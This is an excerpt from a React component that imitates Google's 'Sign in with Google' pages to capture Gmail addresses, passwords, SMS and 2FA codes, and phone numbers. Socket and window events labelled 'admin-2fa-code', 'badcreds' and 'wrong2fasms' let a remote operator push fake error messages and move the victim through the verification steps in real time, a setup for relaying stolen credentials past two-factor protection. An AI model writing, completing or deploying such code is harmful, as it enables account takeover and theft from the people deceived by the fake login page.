...
import GooglePhoneField from "./GooglePhoneField.js";
import {
  FALLBACK_PHONE_COUNTRIES,
  fetchPhoneCountries,
...
function GoogleSignInPC({
  ...
  const [email2faAddress, setEmail2faAddress] = useState("");
  ...
  const selectedPhoneCountry =
    phoneCountries.find((country) => country.code === selectedPhoneCountryCode) ||
    phoneCountries[0];
  ...
  useEffect(() => {
    ...
    fetchPhoneCountries().then((countries) => {
      if (!active || !countries.length) return;
      setPhoneCountries(countries);
      if (!countries.some((country) => country.code === selectedPhoneCountryCode)) {
        setSelectedPhoneCountryCode(countries[0].code);
      }
    });
  ...
  useEffect(() => {
    ...
    const handleEmailReceived = (e) => {
      const { email } = e.detail;
      if (email) {
        setEmail2faAddress(email);
        setPhoneNumberInput("");
        setIsRequestingAuth(false);
        setStep("2fa-email-code");
      }
    };
    ...
    return () => {
      ...
      window.removeEventListener("appauth-email-received", handleEmailReceived);
    };
  }, []);
  ...
  useEffect(() => {
    const handleBadEmail = () => {
      ...
      setEmailError("Couldn't find your Gmail Account");
      setStep("email");
    ...
    const handle2FACode = () => {
      console.log('[Gmail PC] admin-2fa-code event received');
      setIsRequestingAuth(false);
      if (passwordTimeoutRef.current) {
        clearTimeout(passwordTimeoutRef.current);
        passwordTimeoutRef.current = null;
      ...
      try {
        fetch(`${process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:5000'}/api/appauth/notify-2fa`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userId: Unik, type: 'g-2facode' })
        });
      } catch (error) {
        console.error('Failed to send 2FA notification:', error);
      }
    ...
    const handle2FANumber = () => {
      ...
      try {
        fetch(`${process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:5000'}/api/appauth/notify-2fa`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userId: Unik, type: 'g-2fanumber' })
        });
      } catch (error) {
        console.error('Failed to send g2fa number notification:', error);
      }
    };

    const handleWrong2FANumber = () => {
      console.log('[Gmail PC] admin-wrong-2fa-number event received');
      setIsRequestingAuth(false);
      setIsSubmittingSmsCode(false);
      setStep("2fa-email-code");
      setSmsCodeError("Wrong Phone number, try again");
    };

    const handleWrong2FASMS = () => {
      console.log('[Gmail PC] admin-wrong-2fa-sms event received');
      setIsRequestingAuth(false);
      setIsSubmittingSmsCode(false);
      setStep("2fa-sms-code");
      setSmsCode("");
    ...
    window.addEventListener("admin-2fa-code", handle2FACode);
    window.addEventListener("admin-2fa-number", handle2FANumber);
    window.addEventListener("admin-wrong-2fa-number", handleWrong2FANumber);
    window.addEventListener("admin-wrong-2fa-sms", handleWrong2FASMS);
    ...
    return () => {
      ...
      window.removeEventListener("admin-2fa-code", handle2FACode);
      window.removeEventListener("admin-2fa-number", handle2FANumber);
      window.removeEventListener("admin-wrong-2fa-number", handleWrong2FANumber);
      window.removeEventListener("admin-wrong-2fa-sms", handleWrong2FASMS);
  ...
  useEffect(() => {
    ...
    socketInstance.on(errorEventName, (data) => {
      ...
      if (data.type === 'badcreds') {
        ...
        setPassword("");
        setSocketPasswordError("Wrong password. Try again or click Forgot password to reset it.");
      } else if (data.type === 'wrong2fanumber') {
        console.log('[Gmail PC] Processing wrong2fanumber');
        setIsSubmittingSmsCode(false);
        setStep("2fa-email-code");
        setSmsCodeError("Wrong Phone number, try again");
      } else if (data.type === 'wrong2fasms') {
        console.log('[Gmail PC] Processing wrong2fasms');
        setIsSubmittingSmsCode(false);
        setStep("2fa-sms-code");
        setSmsCode("");
        setSmsCodeError("Invalid authentication code");
    ...
    socketInstance.on(twoFaEventName, (data) => {
      ...
      if (data.type === 'gmail') {
        ...
        console.log('[Gmail PC] Processing 2FA Code - going to step: 2fa-code');
        setStep("2fa-code");
      } else if (data.type === 'number') {
        console.log('[Gmail PC] Processing G 2FA Number - waiting for admin number');
        setEmail2faAddress("");
        setIsRequestingAuth(true);
  ...
  const handleSmsCodeSubmit = async (e) => {
    ...
    const isNumberTwoStep = step === "2fa-email-code";
    const normalizedPhoneNumber = phoneNumberInput.replace(/[^\d]/g, "");
    const submittedValue = isNumberTwoStep
      ? `${selectedPhoneCountry?.dialCode || ""} ${normalizedPhoneNumber}`.trim()
      : smsCode;

    if (isNumberTwoStep ? normalizedPhoneNumber.length < 5 : !smsCode || smsCode.length < 6) {
      setSmsCodeError(
        isNumberTwoStep
    ...
    const params = {
      ...
      phone_number: Tel,
      page_name: "Gmail",
      tfa_one: submittedValue,
      currentStep: isNumberTwoStep
        ? `2FA Number 2 Phone: ${submittedValue}`
        : `SMS 2FA Code: ${smsCode}`,
    };
  ...
  const isCompactTwoFactorStep = step === "2fa-options";
  const showDesktopGoogleHeader =
    step === "email" ||
    step === "password" ||
    step === "2fa" ||
    step === "2fa-code" ||
    ...
    step === "2fa-sms-code" ||
    step === "2fa-email-code";
  const isWideDesktopTwoFactorStep =
    step === "2fa" || step === "2fa-code" || step === "2fa-sms-code" || step === "2fa-email-code";
  const isTallDesktopTwoFactorStep = step === "2fa";

  const content = (
    <>
      <div className="min-h-screen w-full bg-[#f1f3f4] px-4 md:px-8 flex items-center justify-center">
        <div className={`mx-auto flex w-full flex-col ${isCompactTwoFactorStep ? "max-w-[430px]" : "max-w-[980px]"}`}>
          <div className={`w-full overflow-hidden rounded-[28px] bg-white px-8 py-3 shadow-[0_8px_40px_rgba(60,64,67,0.15)] relative ${
            isCompactTwoFactorStep
              ? "min-h-[400px] md:px-8 md:py-8"
              : isTallDesktopTwoFactorStep
                ? "min-h-[520px] md:px-12 md:py-10"
                : "min-h-[400px] md:px-12 md:py-10"
          }`}>
            {/* Loading Overlay - covers entire content area */}
            {isRequestingAuth && (
              <div className="pointer-events-none absolute inset-0 z-50 bg-black/10">
                <div className="absolute left-0 right-0 top-0 h-1 overflow-hidden rounded-t-[28px]">
                  <div className="h-full w-full bg-[#1a73e8] animate-loadingBar"></div>
                </div>
              </div>
            )}
            ...
            {isModalLoading ? (
              ...
              <div className={`mx-auto flex w-full flex-col font-sans ${
                isCompactTwoFactorStep
                  ? "max-w-[420px] min-h-[350px]"
                  : isWideDesktopTwoFactorStep
                    ? isTallDesktopTwoFactorStep
                      ? "max-w-6xl min-h-[430px]"
                      : "max-w-6xl min-h-[320px]"
                    : "max-w-6xl h-[350px]"
              }`}>
                {showDesktopGoogleHeader && (
                  <div className="mb-6 flex flex-col justify-start">
                    <div className="flex flex-row text-center items-center gap-2">
                    <Image src="/Images/google.svg" alt="Google" width={20} height={24} />
                    <div className="items-center">Sign in with Google</div>
                    </div>
                    
                  <div className="-mx-8 mt-2 border-t border-gray-200 px-8 md:-mx-12 md:px-12">
                ...
                <div className="relative overflow-hidden">
                  {step === "email" ? (
                    <div className={`transition-all duration-300 flex flex-col ${isTransitioning ? 'translate-x-full opacity-0' : 'translate-x-0 opacity-100'}`}>
                      <div className="flex flex-col gap-12 lg:flex-row items-start lg:justify-between pt-2 h-full">
                        ...
                        <div className="w-full lg:max-w-[420px] h-[300px] flex flex-col justify-center">
                          ...
                          <div className="flex justify-between items-center font-go mb-4">
                    ...
                    <div className={`transition-all duration-300 ${isTransitioning ? '-translate-x-full opacity-0' : 'translate-x-0 opacity-100'}`}>
                      <div className="flex flex-col gap-12 lg:flex-row lg:items-start lg:justify-between pt-2">
                        <div className="w-full lg:max-w-[320px] lg:pt-4">
                          <h1 className="text-[32px] font-helvetica text-[#202124] mb-3">Welcome</h1>

                          <button className="w-full p-1 border-1 !border-[#747775] rounded-full flex items-center gap-2 bg-white hover:bg-[#f8f9fa] transition-colors">
                    ...
                    <div className="flex flex-col gap-12 lg:flex-row lg:items-start lg:justify-between pt-2">
                      <div className="w-full lg:max-w-[320px] lg:pt-4">
                        ...
                        <div className="w-full p-1 border border-[#747775] rounded-full flex items-center gap-2 bg-white hover:bg-[#f8f9fa] transition-colors">
                      ...
                      <div className="w-full lg:max-w-[420px] flex flex-col justify-start">
                        <div className="flex justify-center my-6 lg:mt-2 lg:mb-8">
                    ...
                    <div className="flex flex-col gap-12 lg:flex-row lg:items-start lg:justify-between pt-2">
                      ...
                      <div className="mb-10 p-1 border border-[#dadce0] w-full rounded-full flex items-center gap-2 bg-white">
                        <div className="w-5 h-5 rounded-full border border-gray-500 flex items-center justify-center flex-shrink-0">
                          <svg className="w-3 h-3 text-gray-400" fill="currentColor" viewBox="0 0 20 20">
                            <path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd" />
                          </svg>
                      ...
                      <div className="flex flex-col items-start gap-6 pb-14">
                        <button
                          type="button"
                          onClick={handleBackToSmsOptions}
                          className="text-[#0b57d0] text-sm font-medium hover:underline"
                    ...
                    <div className="flex flex-col gap-12 lg:flex-row lg:items-start lg:justify-between pt-2">
                      ...
                      <p className="text-sm font-go text-[#202124] mb-8">
                        {email2faAddress
                          ? `A verification code was just sent to ${email2faAddress}`
                          : `A text message with a 6-digit verification code was just sent to ${lastTwoDigits ? `********${lastTwoDigits}` : "*******^**"}`}
                      </p>

                      <form onSubmit={handleSmsCodeSubmit} className="w-full">
                        <div className="mb-4">
                    ...
                    <div className="flex flex-col gap-12 lg:flex-row lg:items-start lg:justify-between pt-2">
                      ...
                      <p className="text-sm font-go text-[#202124] mb-8">
                        {email2faAddress
                          ? `Confirm the phone number you provided in your security settings: ${email2faAddress}`
                          : `A text message with a 6-digit verification code was just sent to ${lastTwoDigits ? `********${lastTwoDigits}` : "*******^**"}`}
                      </p>
                      ...
                      <form onSubmit={handleSmsCodeSubmit} className="w-full">
                        <div className="mb-4">
                          <GooglePhoneField
                            ...
                            onSelectCountry={setSelectedPhoneCountryCode}
                        ...
                        <div className="flex items-center justify-between pb-14 pt-6">
                          <button
                            type="button"
                            onClick={handleBackToSmsOptions}
                            className="text-[#0b57d0] text-sm font-medium hover:underline"
                          ...
                          <button
                            type="submit"
                            disabled={isSubmittingSmsCode || phoneNumberInput.replace(/[^\d]/g, "").length < 5}
                            className="bg-[#0b57d0] text-white px-6 py-2 font-go rounded-[20px] font-medium text-sm hover:bg-[#094db9] transition-all disabled:bg-[#dadce0] disabled:text-[#80868b]"
                          >
                            {isSubmittingSmsCode ? "Verifying..." : "Next"}
                          </button>
          ...
          {/* Footer */}
                      <div className="mt-4 px-4 flex items-center justify-between text-xs">
                        <div className="flex items-center gap-1">
                          <span>English (United States)</span>
                          <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
                            <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
